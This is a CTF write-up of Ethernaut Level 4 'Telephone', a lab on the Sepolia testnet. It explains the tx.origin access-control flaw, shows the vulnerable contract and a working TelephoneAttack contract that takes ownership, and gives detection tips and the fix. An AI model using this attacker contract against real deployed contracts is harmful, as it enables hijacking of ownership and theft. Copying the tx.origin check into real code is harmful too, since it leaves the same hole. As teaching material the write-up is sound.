// SPDX-License-Identifier: MIT pragma solidity ^0.8.0;

contract Telephone { address public owner;

constructor() {
    owner = msg.sender;
}

function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}}

# Ethernaut — Level 4: Telephone

**Network:** Sepolia testnet  
**Contract:** `0xfc5A7022EbFc75E76718fdf9ce76188A7Aa740D2`  
**Date completed:** June 2026

---

## What the challenge was

Claim ownership of the contract.  
The contract used `tx.origin` vs `msg.sender` to control who could change the owner.

---

## What confused me

- The attacker contract threw an abstract contract warning in Remix — turned out to be just a warning, not a real error, but it blocked deployment anyway
- Fixed it by removing the interface and using a low-level `.call()` instead, which deployed cleanly

---

## Vulnerability involved

**Improper use of `tx.origin` for access control.**

The contract had this check:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

- `tx.origin` — the original wallet that started the transaction
- `msg.sender` — the immediate caller of the current function

If you call a contract directly from your wallet, both are the same address.  
But if your wallet calls Contract A, which calls Contract B — inside Contract B, `tx.origin` is your wallet but `msg.sender` is Contract A.

The condition `tx.origin != msg.sender` passes when a middleman contract is used, handing over ownership to whoever called the middleman.

---

## How I solved it

**Step 1 — Wrote an attacker contract in Remix**

Used a low-level `.call()` to avoid the abstract contract warning:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    function attack(address _target) public {
        (bool success, ) = _target.call(
            abi.encodeWithSignature("changeOwner(address)", msg.sender)
        );
        require(success, "Attack failed");
    }
}
```

**Step 2 — Deployed on Sepolia via Remix**  
Environment: Browser Extension (MetaMask), Value: 0 wei.

**Step 3 — Called `attack()` with the instance address**
```
0xfc5A7022EbFc75E76718fdf9ce76188A7Aa740D2
```

The call chain was:
```
My wallet → TelephoneAttack → Telephone contract
```
Inside Telephone: `tx.origin` = my wallet, `msg.sender` = TelephoneAttack contract → condition passed → ownership transferred.

**Step 4 — Verified ownership**
```javascript
await contract.owner()
// returned: 0xE7975DD97C358bD8686ee1f2a4FA054aA321d295
```

**Step 5 — Submitted the instance** ✅

---

## How to find this vulnerability in a real contract

**If you have the source code — search for it directly:**
```bash
grep -r "tx.origin" ./contracts/
```

**On Etherscan:**
1. Go to the contract address
2. Click the **Contract** tab → **Code**
3. Press `Ctrl+F` and search `tx.origin`

**Using automated tools:**
- **Slither** flags `tx.origin` misuse automatically
- **MythX** and **Aderyn** also detect it

**The mental checklist when you see `tx.origin`:**

| Usage | Verdict |
|---|---|
| Used for authentication or ownership | ❌ Vulnerable |
| Compared to `msg.sender` | ❌ Vulnerable |
| Used only for logging/informational purposes | ✅ Fine |

---

## Key takeaway

`tx.origin` should **never** be used for authentication or access control.

It is vulnerable to phishing — if a victim wallet interacts with any malicious contract, that contract can silently pass `tx.origin` checks on your protected functions.

The fix is always:
```solidity
require(msg.sender == owner);  // ✅ safe
require(tx.origin == owner);   // ❌ never do this
```

This is essentially a **Broken Access Control** bug (OWASP #1) — the contract thinks it's verifying identity but is checking the wrong value. Same class of vulnerability as IDOR or BAC in web/API security, just in a smart contract context.
